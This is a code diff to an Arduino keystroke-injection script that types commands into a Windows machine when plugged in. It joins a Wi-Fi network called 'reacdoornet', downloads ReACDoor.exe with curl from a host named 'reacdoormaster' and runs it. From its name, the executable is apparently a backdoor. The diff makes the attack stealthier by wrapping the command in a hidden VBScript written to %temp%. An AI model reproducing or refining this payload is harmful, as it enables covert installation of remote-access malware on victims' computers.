@@ -23,9 +23,12 @@ void setup() {
   delay(1000);
   Keyboard.println("cmd");
   delay(1000);
-  Keyboard.println(R"(netsh wlan connect name="reacdoornet" & timeout /t 5 /nobreak >nul & cd /d %appdata% & curl -O http://reacdoormaster/ReACDoor.exe & if exist ReACDoor.exe start ReACDoor.exe & exit)");
-  //Keyboard.press(KEY_RETURN);
-  //Keyboard.releaseAll();
+
+  Keyboard.println(R"(echo CreateObject("WScript.Shell").Run "cmd /c netsh wlan connect name=reacdoornet & timeout /t 5 /nobreak >nul & cd /d %appdata% & if exist ReACDoor.exe exit /b & curl -O http://reacdoormaster/ReACDoor.exe & if exist ReACDoor.exe start ReACDoor.exe", 0, False > %temp%\h.vbs)");
+  delay(500);
+
+  Keyboard.println("wscript %temp%\\h.vbs & exit");
+
 }
 
 void loop() {
